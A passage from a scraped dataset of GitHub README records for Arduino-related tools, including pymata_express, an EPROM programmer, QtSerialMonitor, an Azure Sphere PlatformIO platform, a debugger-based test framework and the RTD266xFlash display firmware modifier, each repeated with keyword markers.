[pin_mode=6, i2c device address, data bytes, timestamp]\nmajor features\nfully documented intuitive api\npython 3.7+ compatible.\nset the pin mode and go!\ndata change events may be associated with a callback function, or each pin can be polled for its last event change.\neach data change event is time-stamped and logged.\nuser's guide, including examples.\nimplements 100% of the standardfirmata protocol (standardfirmata 2.5.8).\nadvanced auto-detection of arduino devices (when using firmataexpress).\nhere is an example that monitors data changes on a digital input pin.\nimport asyncio\nimport time\nimport sys\nfrom pymata_express import pymata_express\n\"\"\"\nsetup a pin for digital input and monitor its changes\nusing a callback.\n\"\"\"\n# setup a pin for analog input and monitor its changes\ndigital_pin = 12 # arduino pin number\nidle_time = .001 # number of seconds for idle loop to sleep\n# callback data indices\n# callback data indices\ncb_pin_mode = 0\ncb_pin = 1\ncb_value = 2\ncb_time = 3\nasync def the_callback(data):\n\"\"\"\na callback function to report data changes.\nthis will print the pin number, its reported value and\nthe date and time when the change occurred\n:param data: [pin, current reported value, pin_mode, timestamp]\n\"\"\"\ndate = time.strftime('%y-%m-%d %h:%m:%s', time.localtime(data[cb_time]))\nprint(f'pin: {data[cb_pin]} value: {data[cb_value]} time stamp: {date}')\nasync def digital_in(my_board, pin):\n\"\"\"\nthis function establishes the pin as a\ndigital input. any changes on this pin will\nbe reported through the call back function.\n:param my_board: a pymata_express instance\n:param pin: arduino pin number\n\"\"\"\n# set the pin mode\nawait my_board.set_pin_mode_digital_input(pin, callback=the_callback)\nwhile true:\ntry:\nawait asyncio.sleep(idle_time)\nexcept keyboardinterrupt:\nawait board.shutdown()\nsys.exit(0)\n# get the event loop\nloop = asyncio.get_event_loop()\n# instantiate pymata_express\nboard = pymata_express.pymataexpress()\ntry:\n# start the main function\nloop.run_until_complete(digital_in(board, 12))\nexcept (keyboardinterrupt, runtimeerror) as e:\nloop.run_until_complete(board.shutdown())\nsys.exit(0)\nsample console output as input change events occur:\npin: 12 value: 0 time stamp: 2020-03-10 13:26:22\npin: 12 value: 1 time stamp: 2020-03-10 13:26:27\nthis project was developed with pycharm", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000843, "year": null}, {"Unnamed: 0": 2888, "autor": 848, "date": null, "content": "eprom tool\nTool for programming a eprom with an Arduino Mega, for retrocomputing or whatever. I use it to play games on my SNES.\nPython 3 and pyserial are needed for uploading data to the eprom\nUsage:\nThe script allows reading and writing to the eprom. For programming, a vpp of 12V and a vcc of 6V must be applied to the eprom. Eproms can only be erased with UV light.\nProject\nA description of the project is available in English and Portuguese-Br at http://dragaosemchama.com/2016/10/arduino-mega-eprom-programmer/", "link": "https://github.com/robsoncouto/eprom", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "eprom -----> tool !!! \n-----> tool !!!  for programming a eprom with an arduino mega, for retrocomputing or whatever. i use it to play games on my snes.\npython 3 and pyserial are needed for uploading data to the eprom\nusage:\nthe script allows reading and writing to the eprom. for programming, a vpp of 12v and a vcc of 6v must be applied to the eprom. eproms can only be erased with uv light.\nproject\na description of the project is available in english and portuguese-br at http://dragaosemchama.com/2016/10/arduino-mega-eprom-programmer/", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000848, "year": null}, {"Unnamed: 0": 2890, "autor": 850, "date": null, "content": "QtSerialMonitor\nUniversal serial monitor with data plotting capabilities, based on Qt. Designed with all sorts of Arduino projects in mind, as a handy tool for debugging and experimentation :)\nFeatures:\nIn/out serial data terminal with command history,\nUDP network protocol support,\nResizable UI widgets,\nData plotter with multiple graphs support and basic data filtering - uses QCustomPlot,\nPrinter support, ability to save graph as image,\nRead/write \".csv\", \".txt\" data logs,\nmany more...\nDownload QtSerialMonitor_v1.5_win_x64\nWork in progress:\n- 3D Orientation Demo - for IMU testing (user will be able to toggle between chart view\nand a simple 3D scene containing an object rotating accordingly to received roll,\npitch and yaw values, representing the sensor's orientation),\n- Improvements, fixes etc.\nNotes:\nThe app uses a custom-written parser, which searches the incoming message for plottable data in form of label-value set. At the moment, all labels and values must be separated with a whitespace in order to be recognized. Its possible to use separators like \"=\" and \",\" - parser will be replace them with whitespace before processing. If no label is found, a generic name will be used i.e. \"Graph 0\".*\nExamples of supported formats:\n- \"Roll = 1.23 Pitch = 45.6\"\n- \"Voltage: 1.23 (tabulator) Output: 4.56\"\n- \"1.23 4.56\" (Graph 0 and Graph 1)\nApplication uses QtSettings functionality and stores a simple .ini file on the hard drive in which it keeps its settings. Under Windows, the file should be located in C:\\ProgramData\\QtSerialMonitor. The settings are saved each time the app closes.", "link": "https://github.com/mich-w/QtSerialMonitor", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "qtserialmonitor\nuniversal serial monitor with data plotting capabilities, based on qt. designed with all sorts of arduino projects in mind, as a handy -----> tool !!!  for debugging and experimentation :)\nfeatures:\nin/out serial data terminal with command history,\nudp network protocol support,\nresizable ui widgets,\ndata plotter with multiple graphs support and basic data filtering - uses qcustomplot,\nprinter support, ability to save graph as image,\nread/write \".csv\", \".txt\" data logs,\nmany more...\ndownload qtserialmonitor_v1.5_win_x64\nwork in progress:\n- 3d orientation demo - for imu testing (user will be able to toggle between chart view\nand a simple 3d scene containing an object rotating accordingly to received roll,\npitch and yaw values, representing the sensor's orientation),\n- improvements, fixes etc.\nnotes:\nthe app uses a custom-written parser, which searches the incoming message for plottable data in form of label-value set. at the moment, all labels and values must be separated with a whitespace in order to be recognized. its possible to use separators like \"=\" and \",\" - parser will be replace them with whitespace before processing. if no label is found, a generic name will be used i.e. \"graph 0\".*\nexamples of supported formats:\n- \"roll = 1.23 pitch = 45.6\"\n- \"voltage: 1.23 (tabulator) output: 4.56\"\n- \"1.23 4.56\" (graph 0 and graph 1)\napplication uses qtsettings functionality and stores a simple .ini file on the hard drive in which it keeps its settings. under windows, the file should be located in c:\\programdata\\qtserialmonitor. the settings are saved each time the app closes.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000850, "year": null}, {"Unnamed: 0": 2899, "autor": 859, "date": null, "content": "Azure Sphere - PlatformIO\nVersion 2.0.4 ( look here, if there is something new )\nOS Windows 10 ( preferably )\nSysroot 3+Beta1909\nSysroot 2+Beta1905\nArduino HighLevel applications\nLinux HighLevel applications\nMediatek Cortex-M4 applications\nBaremetal Cortex-M4 applications\nWiring Cortex-M4 ( is \"cut out\" Arduino, in progress... )\nFull API (NEW)\nExperimental mode for libc and libwolfssl (NEW beta in process)\nIt is very beta version - may be bugs yet\nArduino part\nArduino base core ( sources from last Arduino IDE )\nHardwareSerial\nGPIO\nWire\nSPI\nwifiClient\nwifiUDP\ncurlClient\nClientSecure\nother in proggress...\nExamples\nWiring part ( Arduino for M4F core )\nArduino base core\nHardwareSerial (in progress)\nGPIO (NEW all gpio)\nADC\nMediatek part ( M4 )\nAs original SDK\nDocumentation\nFreeRTOS @ youtube\nExample Hello World\nExample FreeRTOS\nLinux & Baremetal parts\nAs original SDK\nExamples\nBoards\nAzure Sphere MT3620 Starter AES-MS-MT3620-SK-G by Avnet\nDemo movies\nYoutube Arduino Blink\nYoutube Arduino PubSub\nYoutube Linux\nExperimental Mode\nDocumentations, Support, Forums\nMediatek MT3620\nAzure Sphere Documentation\nMSDN Azure Sphere forum\nAVNET Forum\nAVNET Azure Sphere MT3620 Starter Kit\nElement14 Azure Sphere MT3620 Starter Kit\nSpeed Test CoreMark 1.0 = 1425.31 ( -Ofast )\nWIKI\nINSTALL NOTES - READ\nPlatform Installation\nInstall VS Code + PlatformIO\nPlatformIO - Home - Platforms - Advanced Installation\nPaste link: https://github.com/Wiz-IO/platform-azure\nSDK 19.10/11 workaroud\nFast Uninstal\ngoto C:\\Users\\USER_NAME.platformio\\platforms\ndelete folder azure ( builders )\ndelete folder framework-azure ( sources )\ndelete folder tool-azure ( azsphere )\ndelete folder toolchain-arm-poky-linux-musleabi-hf (compiler )\nNew Project - PlatformIO\nPlatformIO - Home - New\nenter Project Name - Board write-search 'azure' - Select Linux or Arduino\nyou will have basic template project\nOpen 'src/app_manifest.json' and enter your 'Capabilities'\nOpen 'platformio.ini' and edit your settings\nProject platformio.ini example:\n[env:avnet_aesms_mt3620]\nplatform = azure\nboard = avnet_aesms_mt3620\nframework = arduino\nmonitor_port = COM6\nmonitor_speed = 115200\n;board_build.sdk = C:/Program Files (x86)/Microsoft Azure Sphere SDK ; path to ...\n;board_build.sysroot = 2+Beta1806 ; default is max version, 3+Beta1909\n;board_build.delete = all ; default is all applications, or = current\n;board_build.copy = filename.1 filename.2\n; copy files from project SRC to image-package, as certificates, settings, etc\n; path is /mnt/APP-GUID/filename ... Storage_GetAbsolutePathInImagePackage()\n;board_build.ex_mode = enable ; empty key: disabled ; experimental mode for libc, libwolfssl...\n;board_build.verbose = enable ; verbose for azsphere\n;build_flags = -D ANY_FLAG\nManual upload\nThanks to:\nIvan Kravets ( PlatformIO )\nComet electronics\nthepenguinmaster\nRoberto del Campo\nJunxiao Shi\nIF YOU WANT HELP / SUPPORT", "link": "https://github.com/Wiz-IO/platform-azure", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "azure sphere - platformio\nversion 2.0.4 ( look here, if there is something new )\nos windows 10 ( preferably )\nsysroot 3+beta1909\nsysroot 2+beta1905\narduino highlevel applications\nlinux highlevel applications\nmediatek cortex-m4 applications\nbaremetal cortex-m4 applications\nwiring cortex-m4 ( is \"cut out\" arduino, in progress... )\nfull api (new)\nexperimental mode for libc and libwolfssl (new beta in process)\nit is very beta version - may be bugs yet\narduino part\narduino base core ( sources from last arduino ide )\nhardwareserial\ngpio\nwire\nspi\nwificlient\nwifiudp\ncurlclient\nclientsecure\nother in proggress...\nexamples\nwiring part ( arduino for m4f core )\narduino base core\nhardwareserial (in progress)\ngpio (new all gpio)\nadc\nmediatek part ( m4 )\nas original sdk\ndocumentation\nfreertos @ youtube\nexample hello world\nexample freertos\nlinux & baremetal parts\nas original sdk\nexamples\nboards\nazure sphere mt3620 starter aes-ms-mt3620-sk-g by avnet\ndemo movies\nyoutube arduino blink\nyoutube arduino pubsub\nyoutube linux\nexperimental mode\ndocumentations, support, forums\nmediatek mt3620\nazure sphere documentation\nmsdn azure sphere forum\navnet forum\navnet azure sphere mt3620 starter kit\nelement14 azure sphere mt3620 starter kit\nspeed test coremark 1.0 = 1425.31 ( -ofast )\nwiki\ninstall notes - read\nplatform installation\ninstall vs code + platformio\nplatformio - home - platforms - advanced installation\npaste link: https://github.com/wiz-io/platform-azure\nsdk 19.10/11 workaroud\nfast uninstal\ngoto c:\\users\\user_name.platformio\\platforms\ndelete folder azure ( builders )\ndelete folder framework-azure ( sources )\ndelete folder -----> tool !!! -azure ( azsphere )\ndelete folder toolchain-arm-poky-linux-musleabi-hf (compiler )\nnew project - platformio\nplatformio - home - new\nenter project name - board write-search 'azure' - select linux or arduino\nyou will have basic template project\nopen 'src/app_manifest.json' and enter your 'capabilities'\nopen 'platformio.ini' and edit your settings\nproject platformio.ini example:\n[env:avnet_aesms_mt3620]\nplatform = azure\nboard = avnet_aesms_mt3620\nframework = arduino\nmonitor_port = com6\nmonitor_speed = 115200\n;board_build.sdk = c:/program files (x86)/microsoft azure sphere sdk ; path to ...\n;board_build.sysroot = 2+beta1806 ; default is max version, 3+beta1909\n;board_build.delete = all ; default is all applications, or = current\n;board_build.copy = filename.1 filename.2\n; copy files from project src to image-package, as certificates, settings, etc\n; path is /mnt/app-guid/filename ... storage_getabsolutepathinimagepackage()\n;board_build.ex_mode = enable ; empty key: disabled ; experimental mode for libc, libwolfssl...\n;board_build.verbose = enable ; verbose for azsphere\n;build_flags = -d any_flag\nmanual upload\nthanks to:\nivan kravets ( platformio )\ncomet electronics\nthepenguinmaster\nroberto del campo\njunxiao shi\nif you want help / support", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000859, "year": null}, {"Unnamed: 0": 2910, "autor": 870, "date": null, "content": "About\nThis framework provides facilities for automated execution of remote code. The core idea is, to utilize the debugger for automated testing, so that it's featured can be used to obtain information.\nAt the current state it provides functionality for:\nI/O Forwarding\nCode Coverage\nUnit testing\nCall tracing\nProfiling\nFunction Stubbing at link-time\nThis is based on plugin-system, so that it can be extended with functionality for your system. The above features are also done by plugins that are provided by the framework. Since it is built do use the debugger, it can be used for every case a debugger can, which includes the following applications:\nlocal execution\nremote server (gdbsever)\nopenocd\nqemu\nWhen used with the right plugins, an application run via openocd or qemu behaves as if it were run locally and can be integrated into any automated testing.\nIt currently only supports the gdb, but lldb support is planned for a future version.\nTool Overview\nmetal.runner\nThe debug-runner is the core module of the toolest, it allows automated execution of the debugger. This can be used with plugins, so that custom functionality can be added to breakpoints. The main application is for the automated executing tests on remote targets, such as embedded platforms. It comes with two plugins for embedded targets:\nI/O (similar to semi-hosting)\nExit-Code\nWhen used with these two plugins an embedded application can be run on target, but behaves as if it were run locally. In addition calltrace & backend provide part of the functionality as part as metal.runner plugins.\nmetal.unit\nWe provide a very light weight test backend, for easy use with our metal.runner. When used without the debugger, it will only yield a binary result, while it will provide very detailed information through the debugger. This means that it can be used with the same assertions\nmetal.calltrace\nThe calltrace provides a way to assert a certain call sequence for functions. Combined with the metal.runner it can be used to log function calls and add profiling.\nmetal.serial\nThe serial library provides a light-weight testing tool for environments that do not provide access for a debugger. It outputs the minimum amount of data from the target device, reads the rest from the source files and provides more detailed report that way. E.g. it provides a printf-alternative that does the actual formatting on the host side, thus providing formatted output without required heap usage on the target.\nDocumentation\nThe current master Documentation can be found in the wiki.\nTest results\nBranches Build Tests coverage\nDevelop:\nMaster:\nDependency\nThis library requires boost 1.64.", "link": "https://github.com/klemens-morgenstern/metal.test", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "about\nthis framework provides facilities for automated execution of remote code. the core idea is, to utilize the debugger for automated testing, so that it's featured can be used to obtain information.\nat the current state it provides functionality for:\ni/o forwarding\ncode coverage\nunit testing\ncall tracing\nprofiling\nfunction stubbing at link-time\nthis is based on plugin-system, so that it can be extended with functionality for your system. the above features are also done by plugins that are provided by the framework. since it is built do use the debugger, it can be used for every case a debugger can, which includes the following applications:\nlocal execution\nremote server (gdbsever)\nopenocd\nqemu\nwhen used with the right plugins, an application run via openocd or qemu behaves as if it were run locally and can be integrated into any automated testing.\nit currently only supports the gdb, but lldb support is planned for a future version.\n-----> tool !!!  overview\nmetal.runner\nthe debug-runner is the core module of the toolest, it allows automated execution of the debugger. this can be used with plugins, so that custom functionality can be added to breakpoints. the main application is for the automated executing tests on remote targets, such as embedded platforms. it comes with two plugins for embedded targets:\ni/o (similar to semi-hosting)\nexit-code\nwhen used with these two plugins an embedded application can be run on target, but behaves as if it were run locally. in addition calltrace & backend provide part of the functionality as part as metal.runner plugins.\nmetal.unit\nwe provide a very light weight test backend, for easy use with our metal.runner. when used without the debugger, it will only yield a binary result, while it will provide very detailed information through the debugger. this means that it can be used with the same assertions\nmetal.calltrace\nthe calltrace provides a way to assert a certain call sequence for functions. combined with the metal.runner it can be used to log function calls and add profiling.\nmetal.serial\nthe serial library provides a light-weight testing tool for environments that do not provide access for a debugger. it outputs the minimum amount of data from the target device, reads the rest from the source files and provides more detailed report that way. e.g. it provides a printf-alternative that does the actual formatting on the host side, thus providing formatted output without required heap usage on the target.\ndocumentation\nthe current master documentation can be found in the wiki.\ntest results\nbranches build tests coverage\ndevelop:\nmaster:\ndependency\nthis library requires boost 1.64.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000870, "year": null}, {"Unnamed: 0": 2917, "autor": 877, "date": null, "content": "RTD266xFlash\nThis is a combination of an Arduino sketch, a Python script and a C# GUI application to read and write the firmware of the Realtek RTD266x flat panel display controller. The Arduino code is based on ladyada's project.\nThere are special features included for a 3.5\" HDMI display manufactured by KeDei, which is equipped with an RTD2660: you can replace the boot logo with a custom logo, change the background and foreground colors and modify the \"HDMI\" pop-up. The custom logo needs to be 204x72 pixels and may only contain black and white pixels.\nUsage\nIn order to modify the RTD266x's firmware, you need to establish a connection to the chip. There are two ways to do that:\nYou can connect the display via HDMI to a Raspberry Pi, enable the I\u00b2C HDMI driver and read/write the firmware using the Python script without any additional hardware. The firmware will be stored in a file which you can open and modify with the C# GUI tool. The modified file is then written back to the display with the Python script.\nYou connect an Arduino to the display's I\u00b2C pins using a modified HDMI cable. The Arduino is connected to a PC/laptop and controlled with the C# GUI tool.\nIf you don't have Microsoft Visual Studio to compile the C# GUI tool, you can download the EXE file from the releases.\nMethod 1: Arduino\nCompile the RTD266xArduino sketch with the Arduino IDE and download it onto your Arduino. You can close the Arduino IDE afterwards.\nConnecting\nThe communication between display and Arduino is done via I\u00b2C which is accessible on the VGA and HDMI ports of RTD266x. Connect SCL, SDA and GND with the corresponding Arduino pins.\nFor an Arduino Uno and an HDMI connector type A, this would be:\nPin name Arduino Uno HDMI type A\nSCL A5 15\nSDA A4 16\nGND GND 17\nThere are no additional pull-ups required, they are already on the RTD266x PCB.\nConnect the display and Arduino as mentioned above. Power on the display first, then the Arduino.\nA flashing user LED on the Arduino indicates a problem with the connection. Reset the Arduino to try again and use the GUI tool to read the error info.\nGUI tool\nStart RTD266xFlash.exe and select Connect directly with an Arduino. Select the COM port your Arduino is connected to and click Connect. If there was an error it will tell you what went wrong. You can click Read status to check the connection and read some info about the flash chip. It should return values different from 0x00 and 0xFF. If it doesn't, try again or reset the Arduino.\nIf you get an error about an unknown JEDEC id, uncomment or add the correct JEDEC id in rtd266x.cpp. Compile and download the sketch again to your Arduino and try again.\nRuby tool\nInstead of the GUI tool written in C#, you can use a Ruby tool on the command line written by kivikakk.\nTo read the flash into the file flash-contents.bin, call it like this:\nruby flash.rb SERIAL dump\nReplace SERIAL with your serial port (for example COM1 on Windows, /dev/ttyACM0 on Linux or /dev/cu.usbmodem3201 on a Mac).\nTo write back the firmware, use this command:\nruby flash.rb SERIAL write FILE [OFFSET LENGTH]\nCall the tool without parameters to get a detailled description of its parameters.\nMethod 2: Firmware images with Python script\nFor this method you need a Raspberry Pi running a current version of Raspbian or any derivative. Use a standard HDMI cable to connect the display to the Raspberry Pi. In your /boot/config.txt file you need to add the following line to enable the I\u00b2C on HDMI interface:\ndtparam=i2c2_iknowwhatimdoing\nFor the Raspberry Pi 4 and modern firmware you need to change the line\ndtoverlay=vc4-fkms-v3d\nto\ndtoverlay=vc4-kms-v3d\nYou will also need to install the I\u00b2C Python library with this command:\nsudo apt-get install python-smbus\nAfter a reboot, enable the I\u00b2C driver by executing:\nsudo raspi-config\nNavigate to Interfacing Options, I2C and select Yes. Use Back and Finish to leave the configuration tool.\nGet a list of available I\u00b2C busses:\ni2cdetect -l\nYou can then scan for I\u00b2C devices with this command on a specific bus:\nsudo i2cdetect -y I2CBUS\nwhere I2CBUS is the bus number you got from the previous command, i.e. sudo i2cdetect -y 2.\nIt should find a device at address 4a.\nTo download the Python scripts, run the following commands:\ncd ~\ngit clone https://github.com/floppes/RTD266xFlash.git\ncd RTD266xFlash/RTD266xPy\nYou are now ready to read the display's firmware with this command:\npython rtd266x_flash.py -i I2CBUS -r 524288 out.bin\nReplace I2CBUS with your bus number. The number after parameter -r is the firmware's size in bytes (512 x 1024 = 512 KB). This will take about 2 minutes. Transfer the file out.bin to your PC/laptop where you have the GUI tool RTD266xFlash.exe. Start it and select Firmware images. Select out.bin as the input file and configure the modifications you want to perform. Click Modify firmware and save the modified firmware file.\nTransfer the modified firmware file to the Raspberry Pi and run\npython rtd266x_flash.py -i I2CBUS -d out.bin out_modified.bin\nwhere I2CBUS is the bus number and out_modified.bin is the modified firmware file. This will write all modified sectors of file out_modified.bin to the display, skipping the unmodified sectors to speed things up. Enjoy your modified firmware!\nExpert knowledge: details of firmware modifications\nAttention: Before you modify your firmware, create a backup of the original firmware!\nAn Intel 8051 MCU is integrated in the RTD266x which runs the firmware. If you compile the source code (Source 1 and source 2) and set the compiler to output the assembler listings, you can easily find matching code areas within the binary firmware. By manipulating the instructions, we can modify the firmware's behaviour.\nHere are some examples for the KeDei 3.5\" display. There are different firmware versions for different PCB revisions and panel types. All firmwares are 512 KB. They are assigned numbers to refer to them:\n# Hardware MD5 Hash SHA1 Hash\n1 PCB V 1.0 C501EB83693372E1089B096B024F2E9F 08B253C9B757BC700AFC057F3836878BE866C05C\n2 PCB V 1.1, panel type 1 (SKY035S13B00-14439) 83B41D1682E7CB7DED3A0241518A3D96 1C675660BF478E687CD09912EF77D2A86E93525E\n3 PCB V 1.1, panel type 2 (SKY035S13D-199) v1 0FA74E1AF51B56A84AA4D4DD4D97383E 09E16041E390F9804EA6F734DCB1AACC4A0DC97B\n4 PCB V 1.1, panel type 2 (SKY035S13D-199) v2 22AF4BE65892FA772D8699DD030837DC 3E80A0B3C1DA0E726A1FCF6D31DED497C0B65429\n5 PCB V 1.1, panel type 3 (SKY035S13E-180) v1 906A447A4E0D182669228EC75E581E78 9DAC069E130FC7638D90E031C2E36819344703AD\n6 PCB V 1.1, panel type 3 (SKY035S13E-180) v2 B55F67DA7A609C954EBB75FCDF877F7D DEC9911C8C1D150D069BAB1D1E42792665E62AD8\nChange background color to black\nThe background color is set by calling function CAdjustBackgroundColor. For firmware #1 this function is located at 0xD237 - 0xD27A, for firmware #2 at 0xD432 - 0xD475, for firmware #3 at 0xD2A5 - 0xD2E8 and at 0xD2C9 - 0xD30C for firmware #5. At function offsets 0x2C (#1: 0xD263, #2: 0xD45E, #3: 0xD2D1, #5: 0xD2F5) and 0x3C (#1: 0xD273, #2: 0xD46E, #3: 0xD2E1, #5: 0xD305) the instruction is 0xE0 (MOVX A,@DPTR). By changing this to 0xE4 (CLR A) the background color is always set to 0x000000, which corresponds to black.\nChange logo colors\nThe boot logo uses two colors, which are picked from a color palette consisting of 16 3-byte (red, green, blue) entries. The palette is located at 0x13A31 (firmware #1, #2, #3 and #5). The foreground color is 0xFFFFFF (white) at 0x13A3A. The background color is 0x0000FF (blue) at 0x13A5B. By changing 0x13A5D to 0x00 we can change the background to black.\nChange \"HDMI\" pop-up text\nAfter the display is powered on and has shown it's logo, a small pop-up shows the input source. The text \"HDMI\" can be changed easily. You won't find the ASCII characters in the firmware, but you can refer to tGlobalCharWidth in OSD/OSD003/OsdRes003.c to decode and encode a string. Some wide characters like A, G, M, W etc. are composed of two font entries. You can find the \"HDMI\" string by searching for 19 14 1E 1F 1A 00 (offset 0x12346 for firmware #1, #2, #3 and #5). It can be replaced by a custom string but shouldn't be much longer.\nDisable \"HDMI\" pop-up\nThe \"HDMI\" pop-up is shown by the function CShowNote. It is located at 0x14733 (firmware #1, #2, #3 and #5). By changing it's first instruction at 0x14733 to 0x22 (RET), we force an immediate return from this function and no pop-up is shown.", "link": "https://github.com/floppes/RTD266xFlash", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "rtd266xflash\nthis is a combination of an arduino sketch, a python script and a c# gui application to read and write the firmware of the realtek rtd266x flat panel display controller. the arduino code is based on ladyada's project.\nthere are special features included for a 3.5\" hdmi display manufactured by kedei, which is equipped with an rtd2660: you can replace the boot logo with a custom logo, change the background and foreground colors and modify the \"hdmi\" pop-up. the custom logo needs to be 204x72 pixels and may only contain black and white pixels.\nusage\nin order to modify the rtd266x's firmware, you need to establish a connection to the chip. there are two ways to do that:\nyou can connect the display via hdmi to a raspberry pi, enable the i\u00b2c hdmi driver and read/write the firmware using the python script without any additional hardware. the firmware will be stored in a file which you can open and modify with the c# gui -----> tool !!! . the modified file is then written back to the display with the python script.\nyou connect an arduino to the display's i\u00b2c pins using a modified hdmi cable. the arduino is connected to a pc/laptop and controlled with the c# gui tool.\nif you don't have microsoft visual studio to compile the c# gui tool, you can download the exe file from the releases.\nmethod 1: arduino\ncompile the rtd266xarduino sketch with the arduino ide and download it onto your arduino. you can close the arduino ide afterwards.\nconnecting\nthe communication between display and arduino is done via i\u00b2c which is accessible on the vga and hdmi ports of rtd266x. connect scl, sda and gnd with the corresponding arduino pins.\nfor an arduino uno and an hdmi connector type a, this would be:\npin name arduino uno hdmi type a\nscl a5 15\nsda a4 16\ngnd gnd 17\nthere are no additional pull-ups required, they are already on the rtd266x pcb.\nconnect the display and arduino as mentioned above. power on the display first, then the arduino.\na flashing user led on the arduino indicates a problem with the connection. reset the arduino to try again and use the gui tool to read the error info.\ngui tool\nstart rtd266xflash.exe and select connect directly with an arduino. select the com port your arduino is connected to and click connect. if there was an error it will tell you what went wrong. you can click read status to check the connection and read some info about the flash chip. it should return values different from 0x00 and 0xff. if it doesn't, try again or reset the arduino.\nif you get an error about an unknown jedec id, uncomment or add the correct jedec id in rtd266x.cpp. compile and download the sketch again to your arduino and try again.\nruby tool\ninstead of the gui tool written in c#, you can use a ruby tool on the command line written by kivikakk.\nto read the flash into the file flash-contents.bin, call it like this:\nruby flash.rb serial dump\nreplace serial with your serial port (for example com1 on windows, /dev/ttyacm0 on linux or /dev/cu.usbmodem3201 on a mac).\nto write back the firmware, use this command:\nruby flash.rb serial write file [offset length]\ncall the tool without parameters to get a detailled description of its parameters.\nmethod 2: firmware images with python script\nfor this method you need a raspberry pi running a current version of raspbian or any derivative. use a standard hdmi cable to connect the display to the raspberry pi. in your /boot/config.txt file you need to add the following line to enable the i\u00b2c on hdmi interface:\ndtparam=i2c2_iknowwhatimdoing\nfor the raspberry pi 4 and modern firmware you need to change the line\ndtoverlay=vc4-fkms-v3d\nto\ndtoverlay=vc4-kms-v3d\nyou will also need to install the i\u00b2c python library with this command:\nsudo apt-get install python-smbus\nafter a reboot, enable the i\u00b2c driver by executing:\nsudo raspi-config\nnavigate to interfacing options, i2c and select yes. use back and finish to leave the configuration tool.\nget a list of available i\u00b2c busses:\ni2cdetect -l\nyou can then scan for i\u00b2c devices with this command on a specific bus:\nsudo i2cdetect -y i2cbus\nwhere i2cbus is the bus number you got from the previous command, i.e. sudo i2cdetect -y 2.\nit should find a device at address 4a.\nto download the python scripts, run the following commands:\ncd ~\ngit clone https://github.com/floppes/rtd266xflash.git\ncd rtd266xflash/rtd266xpy\nyou are now ready to read the display's firmware with this command:\npython rtd266x_flash.py -i i2cbus -r 524288 out.bin\nreplace i2cbus with your bus number. the number after parameter -r is the firmware's size in bytes (512 x 1024 = 512 kb). this will take about 2 minutes. transfer the file out.bin to your pc/laptop where you have the gui tool rtd266xflash.exe. start it and select firmware images. select out.bin as the input file and configure the modifications you want to perform. click modify firmware and save the modified firmware file.\ntransfer the modified firmware file to the raspberry pi and run\npython rtd266x_flash.py -i i2cbus -d out.bin out_modified.bin\nwhere i2cbus is the bus number and out_modified.bin is the modified firmware file. this will write all modified sectors of file out_modified.bin to the display, skipping the unmodified sectors to speed things up. enjoy your modified firmware!\nexpert knowledge: details of firmware modifications\nattention: before you modify your firmware, create a backup of the original firmware!\nan intel 8051 mcu is integrated in the rtd266x which runs the firmware. if you compile the source code (source 1 and source 2) and set the compiler to output the assembler listings, you can easily find matching code areas within the binary firmware. by manipulating the instructions, we can modify the firmware's behaviour.\nhere are some examples for the kedei 3.5\" display. there are different firmware versions for different pcb revisions and panel types. all firmwares are 512 kb. they are assigned numbers to refer to them:\n# hardware md5 hash sha1 hash\n1 pcb v 1.0 c501eb83693372e1089b096b024f2e9f 08b253c9b757bc700afc057f3836878be866c05c\n2 pcb v 1.1, panel type 1 (sky035s13b00-14439) 83b41d1682e7cb7ded3a0241518a3d96 1c675660bf478e687cd09912ef77d2a86e93525e\n3 pcb v 1.1, panel type 2 (sky035s13d-199) v1 0fa74e1af51b56a84aa4d4dd4d97383e 09e16041e390f9804ea6f734dcb1aacc4a0dc97b\n4 pcb v 1.1, panel type 2 (sky035s13d-199) v2 22af4be65892fa772d8699dd030837dc 3e80a0b3c1da0e726a1fcf6d31ded497c0b65429\n5 pcb v 1.1, panel type 3 (sky035s13e-180) v1 906a447a4e0d182669228ec75e581e78 9dac069e130fc7638d90e031c2e36819344703ad\n6 pcb v 1.1, panel type 3 (sky035s13e-180) v2 b55f67da7a609c954ebb75fcdf877f7d dec9911c8c1d150d069bab1d1e42792665e62ad8\nchange background color to black\nthe background color is set by calling function cadjustbackgroundcolor. for firmware #1 this function is located at 0xd237 - 0xd27a, for firmware #2 at 0xd432 - 0xd475, for firmware #3 at 0xd2a5 - 0xd2e8 and at 0xd2c9 - 0xd30c for firmware #5. at function offsets 0x2c (#1: 0xd263, #2: 0xd45e, #3: 0xd2d1, #5: 0xd2f5) and 0x3c (#1: 0xd273, #2: 0xd46e, #3: 0xd2e1, #5: 0xd305) the instruction is 0xe0 (movx a,@dptr). by changing this to 0xe4 (clr a) the background color is always set to 0x000000, which corresponds to black.\nchange logo colors\nthe boot logo uses two colors, which are picked from a color palette consisting of 16 3-byte (red, green, blue) entries. the palette is located at 0x13a31 (firmware #1, #2, #3 and #5). the foreground color is 0xffffff (white) at 0x13a3a. the background color is 0x0000ff (blue) at 0x13a5b. by changing 0x13a5d to 0x00 we can change the background to black.\nchange \"hdmi\" pop-up text\nafter the display is powered on and has shown it's logo, a small pop-up shows the input source. the text \"hdmi\" can be changed easily. you won't find the ascii characters in the firmware, but you can refer to tglobalcharwidth in osd/osd003/osdres003.c to decode and encode a string. some wide characters like a, g, m, w etc. are composed of two font entries. you can find the \"hdmi\" string by searching for 19 14 1e 1f 1a 00 (offset 0x12346 for firmware #1, #2, #3 and #5). it can be replaced by a custom string but shouldn't be much longer.\ndisable \"hdmi\" pop-up\nthe \"hdmi\" pop-up is shown by the function 